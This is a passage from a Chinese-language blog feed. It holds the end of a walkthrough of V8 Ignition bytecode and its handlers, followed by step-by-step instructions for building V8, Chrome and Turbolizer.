     Star r2</span><br><span class="line">14          0x3f5e20aafe0d @   23 : 03 01             LdaSmi [1]</span><br><span class="line">15          0x3f5e20aafe0f @   25 : 1f f7             Star r3</span><br><span class="line">16          0x3f5e20aafe11 @   27 : 55 ab 01 f9 03    CallRuntime [InitializeVarGlobal], r1-r3</span><br><span class="line">17          0x3f5e20aafe16 @   32 : 04                LdaUndefined</span><br><span class="line">18   118 S&gt; 0x3f5e20aafe17 @   33 : 96                Return</span><br><span class="line">19 Constant pool (size = 2)</span><br><span class="line">20 0x3f5e20aafda1: [FixedArray]</span><br><span class="line">21  - map = 0x1cfd2a282309 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line">22  - length: 2</span><br><span class="line">23            0: 0x3f5e20aafd71 &lt;FixedArray[4]&gt;</span><br><span class="line">24            1: 0x2315b1a87ef9 &lt;String[1]: a&gt;</span><br></pre></td></tr></table></figure></p><p>here，函数名称输入到函数字节码中。</p><p><code>0  [generating bytecode for function: ]</code></p><p>这是堆栈的参数数量。该字节码是全局的，所以忽略它。</p><p><code>1  Parameter count 1</code></p><p>FrameSize是已分配寄存器的数量*指针大小。指针大小大致相同，32位为4字节，64位为8字节。在这种情况下，由于分配的寄存器数是4 64位环境，因此指针大小为8字节<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 * 8 = 32。</span><br><span class="line">2  Frame size 32</span><br></pre></td></tr></table></figure></p><p>每个字节串是当前地址的偏移字节码的数字字节码名称操作数。<br><code>3  0x3f5e20aafdf6 @    0 : 09 00             LdaConstant [0]</code><br>这是常量值池的内容。在此示例中，变量名称为a。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">19 Constant pool (size = 2)</span><br><span class="line">20 0x3f5e20aafda1: [FixedArray]</span><br><span class="line">21  - map = 0x1cfd2a282309 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line">22  - length: 2</span><br><span class="line">23            0: 0x3f5e20aafd71 &lt;FixedArray[4]&gt;</span><br><span class="line">24            1: 0x2315b1a87ef9 &lt;String[1]: a&gt;</span><br></pre></td></tr></table></figure></p><p>现在看看基于这些信息的源代码和字节码。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3           0x3f5e20aafdf6 @    0 : 09 00             LdaConstant [0]</span><br><span class="line">4           0x3f5e20aafdf8 @    2 : 1f f9             Star r1</span><br><span class="line">5           0x3f5e20aafdfa @    4 : 02                LdaZero</span><br><span class="line">6           0x3f5e20aafdfb @    5 : 1f f8             Star r2</span><br><span class="line">7           0x3f5e20aafdfd @    7 : 20 fe f7          Mov &lt;closure&gt;, r3</span><br><span class="line">8           0x3f5e20aafe00 @   10 : 55 aa 01 f9 03    CallRuntime [DeclareGlobalsForInterpreter], r1-r3</span><br><span class="line">9      0 E&gt; 0x3f5e20aafe05 @   15 : 92                StackCheck</span><br></pre></td></tr></table></figure></p><p>从这里真正开始 produce</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//将常量池中索引1（变量名a）的值加载到累加器中。</span><br><span class="line">10 116 S&gt; 0x3f5e20aafe06 @ 16:09 01 LdaConstant [1]</span><br><span class="line">11 //将累加器的值（变量名a）加载到r1寄存器中。</span><br><span class="line">12 0x3f5e20aafe08 @ 18：1f f9 Star r1</span><br><span class="line">13 //加载累加器0。</span><br><span class="line">14 0x3f5e20aafe0a @ 20:02 LdaZero</span><br><span class="line">15 //将值从累加器（0）加载到r2寄存器中。</span><br><span class="line">16 0x3f5e20aafe0b @ 21：1 f f 8 Star r 2</span><br><span class="line">17 //将立即值1加载到累加器中。</span><br><span class="line">18 0x3f5e20aafe0d @ 23:03 01 Lda Smi [1]</span><br><span class="line">19 //将累加器（1）的值加载到r3寄存器中。</span><br><span class="line">20 0x3f5e20aafe0f @ 25：1 f f 7 Star r 3</span><br><span class="line">21 //使用r1寄存器中的r3寄存器值（a，0,1）调用InitializeVarGlobal运行时。</span><br><span class="line">22 0x3f5e20aafe11 @ 27:55 ab 01 f9 03 CallRuntime [InitializeVarGlobal]，r1-r3</span><br><span class="line">23 //将undefined设置为accumulator</span><br><span class="line">24 0x3f5e20aafe16 @ 32:04  LdaUndefined</span><br><span class="line">25 / /完成</span><br><span class="line">26 118 S&gt; 0x3f5e20aafe17 @ 33:96 Return</span><br></pre></td></tr></table></figure><p>值得注意的时，在CallRuntime的情况下，需要为每个运行时确定调用约定，因此有必要相应地分配寄存器。</p><p>InitializeVarGlobal运行时调用需要以下寄存器。</p><ul><li>r0 =要绑定的变量名称</li><li>r1 = LaunguageMode SLOPPY（正常）STRICT（严格模式）LAUNGUAGE_END（未知）</li><li>r2 =要绑定的值</li></ul><p>因此，上面的代码:</p><ul><li>将值加载到累加器中</li><li>将值加载到寄存器中</li><li>loop</li></ul><h3><span id="字节码执行">字节码执行</span></h3><h4><span id="bytecodehandler">BytecodeHandler</span></h4><p>字节码处理由BytecodeHandler完成。<br>BytecodeHandler在v8初始化时将被生成。</p><p>以下是BytecodeHandler的示例。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IGNITION_HANDLER(LdaZero, InterpreterAssembler) &#123;</span><br><span class="line">  Node* zero_value = NumberConstant(0.0);</span><br><span class="line">  SetAccumulator(zero_value);</span><br><span class="line">  Dispatch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在BytecoeHandler load zero的过程中，将累加器设置为0。实际上，每组字节码都将有一个这样的BytecodeHandler。每个BytecodeHandler通过depatch直接调用下一个BytecodeHandler。下图显示了BytecodeHandler的生成<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003811.png" alt></p><h4><span id="interpreterentrytrampoline">InterpreterEntryTrampoline</span></h4><p>在Ignition终于生成了BytecodeArray之后，从使用InterpreterEntryTrampoline代码构建的代码中点燃DispatchTable of Ignition，它从BytecodeArray中检索字节码并执行相应DispatchTable的处理并转发。下图显示了Ignition的执行方式</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003824.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Analysis-of-Ignition&quot;&gt;&lt;a href=&quot;#Intro-Analysis-of-Ignition&quot; class=&quot;headerlink&quot; title=&quot;Intro: Analysis of Ignition&quot;&gt;&lt;/a&gt;Intro: Analysis of Ignition&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/Basic/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/tags/V8/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/tags/Basic/"/>
    
  </entry>
  
  <entry>
    <title>V8 &amp; Chrome Setup</title>
    <link href="http://p1umer.gituhb.io/2018/07/01/V8-Environmental-Configuration/"/>
    <id>http://p1umer.gituhb.io/2018/07/01/V8-Environmental-Configuration/</id>
    <published>2018-07-01T09:35:44.000Z</published>
    <updated>2019-07-04T16:39:02.022Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-setup-of-v8-amp-chrome">Intro: Setup of V8 &amp; Chrome</span></h2> <a id="more"></a><h2><span id="v8-build">V8 Build</span></h2><h3><span id="linux">linux</span></h3><h4><span id="pre-work">Pre Work</span></h4><ul><li><p>Install Git</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure></li><li><p>Install depot_tools</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br><span class="line">export PATH=~/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="key-step">Key Step</span></h4><ul><li><p>BUILD.sh</p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></li><li><p>此时编译的是最新版本的v8，若想切换分支，执行：</p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard +hash</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br><span class="line"></span><br><span class="line">OR </span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></li></ul><h3><span id="windows">Windows</span></h3><h4><span id="prework">Prework</span></h4><ul><li>Visual Studio 2017</li><li><a href="https://chromium.googlesource.com/new-password" target="_blank" rel="noopener">设置 git cookie</a> </li><li><a href="https://link.zhihu.com/?target=https%3A//go.microsoft.com/fwlink/p/%3FLinkId%3D845298" target="_blank" rel="noopener">Windows SDK</a></li></ul><h4><span id="key-stap">Key STAP</span></h4><ul><li>打开适用于 VS 2017 的 X64 本机工具命令提示框</li><li>再次确认上一步已完成，注意不是cmd窗口<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">SET depot_tools 环境变量，将其放在存有python.exe的环境变量前或者直接置顶</span><br><span class="line">set DEPOT_TOOLS_WIN_TOOLCHAIN=0</span><br><span class="line">set GYP_MSVS_VERSION=2017</span><br><span class="line">mkdir v8 &amp;&amp; cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">gn gen --ide=vs out.gn\x64_solution</span><br><span class="line">python tools\dev\v8gen.py x64.release</span><br><span class="line">ninja -C out.gn\x64.release</span><br></pre></td></tr></table></figure></li></ul><h2><span id="chrome-build">Chrome Build</span></h2><h3><span id="windows">Windows</span></h3><h4><span id="pre-work">Pre Work</span></h4><ul><li><p>Install Git</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure></li><li><p>Install depot_tools</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br><span class="line">export PATH=~/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="key-step">Key Step</span></h4><ul><li>BUILD.sh<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set DEPOT_TOOLS_WIN_TOOLCHAIN=0</span><br><span class="line">set GYP_MSVS_VERSION=2017</span><br><span class="line">gclient</span><br><span class="line">mkdir chromium &amp;&amp; cd chromium</span><br><span class="line">fetch chromium</span><br><span class="line">git checkout -b &lt;local-branch-name&gt; tags/&lt;tag name&gt;</span><br><span class="line">gclient sync</span><br><span class="line">cd src  </span><br><span class="line">gn gen --ide=vs out/Default  </span><br><span class="line">ninja -C out/Default chrome</span><br></pre></td></tr></table></figure></li></ul><h2><span id="preparing-turbolizer">Preparing Turbolizer</span></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Setup-of-V8-amp-Chrome&quot;&gt;&lt;a href=&quot;#Intro-Setup-of-V8-amp-Chrome&quot; class=&quot;headerlink&quot; title=&quot;Intro: Setup of V8 &amp;amp; Chrome&quot;&gt;&lt;/a&gt;Intro: Setup of V8 &amp;amp; Chrome&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/Basic/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/tags/V8/"/>
    
      <category term="Basic" scheme="http://p1umer.gituhb.io/tags/Basic/"/>
    
  </entry>
  
</feed>
